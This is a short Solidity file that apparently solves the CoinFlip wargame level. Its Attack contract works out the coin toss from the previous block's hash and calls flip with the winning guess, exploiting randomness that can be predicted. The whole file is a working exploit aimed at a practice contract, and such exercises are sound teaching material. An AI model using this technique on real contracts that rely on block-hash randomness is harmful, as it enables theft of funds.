// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import {CoinFlip} from "./Coinflip.sol";

contract Attack {
    CoinFlip coinflip;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip _coinflip) {
        coinflip = _coinflip;
    }

    function coinFlipGuess() public returns (uint256, uint256, uint256) {
        uint256 blockVal = uint256(blockhash(block.number - 1));
        uint256 result = blockVal / FACTOR;

        if (result == 1) {
            coinflip.flip(true);
        } else {
            coinflip.flip(false);
        }
        return (blockVal, result, block.number);
    }

    function getConsecutiveWins() public view returns (uint256) {
        return coinflip.consecutiveWins();
    }
}
